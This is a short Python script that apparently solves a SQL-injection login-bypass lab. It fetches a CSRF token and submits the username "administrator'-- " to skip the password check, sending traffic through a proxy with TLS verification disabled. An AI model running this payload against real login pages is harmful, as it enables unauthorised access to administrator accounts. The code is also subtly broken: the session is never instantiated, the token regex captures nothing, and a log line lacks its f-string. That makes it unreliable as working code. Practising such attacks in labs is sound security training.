import re
import sys
import logging
import urllib3 #25 line ->

import requests

from shop import Shop
import utils


log = logging.getLogger(__name__) 
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

def main(args):
    shop = Shop(args.url) #ошибка при одинаковом названии модуля и переменного shop=shop >:( 
    session = requests.Session
    log.info("getting login url")
    if args.no_proxy:
        r = session.get(shop.login_url)
    else:
        r = session.get(shop.login_url, proxies=utils.PROXIES, verify=False)
    if not r.status_code == 200:
        log.error("Could not get login page")
        sys.exit()
    pattern = re.compile(r'name="csrf" value="(.*?)')    
    m = pattern.search(r.text)    
    csrf_token = m[1]
    log.info("Found CSRF token: {csrf_token}")
    data = {
        "csrf": csrf_token,
        "username": "administrator'-- ", #space for correct validation in sql
        "password": "zzz",
    }
    log.info("Attepmting to login")
    if args.no_proxy:
        r = session.post(shop.login_url, data=data)
    else:
        r = session.post(shop.login_url, data=data, proxies=utils.PROXIES, verify=False)
    if r.status_code == 200:
        utils.is_solved(shop.base_url, args.base_url)
        


if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
